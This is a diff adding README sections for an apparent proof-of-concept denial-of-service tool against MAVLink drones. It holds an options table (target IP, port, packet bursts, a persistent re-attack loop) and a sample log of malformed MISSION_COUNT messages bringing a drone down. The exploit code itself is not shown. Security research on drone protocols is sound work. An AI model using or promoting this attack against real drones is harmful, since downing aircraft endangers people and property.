@@ -36,3 +36,26 @@ This enhanced PoC implements a **reliable, persistent, and multi-protocol** atta
 
 ```bash
 pip install pymavlink
+
+
+### Options
+
+| Option        | Description                              | Default       |
+|---------------|------------------------------------------|---------------|
+| `--ip`        | Drone IP address                         | 192.168.42.1  |
+| `--port`      | MAVLink port                             | 14550         |
+| `--protocol`  | `udp` or `tcp`                           | udp           |
+| `--burst`     | Number of malicious packets per burst     | 10            |
+| `--delay`     | Delay between packets (seconds)          | 0.1           |
+| `--persistent`| Infinite loop – reconnect & re-attack    | off           |
+
+---
+
+## Example Output (Successful DoS)
+
+```log
+12:34:56 [INFO] Attempting UDP connection to 192.168.42.1:14550...
+12:34:57 [INFO] Connected! System ID: 1, Component ID: 1
+12:34:57 [INFO] Launching DoS burst: 25 malformed MISSION_COUNT messages...
+12:34:59 [CRITICAL] No heartbeat received - DoS SUCCESSFUL!
+12:35:00 [CRITICAL] Exploit successful - drone is down!
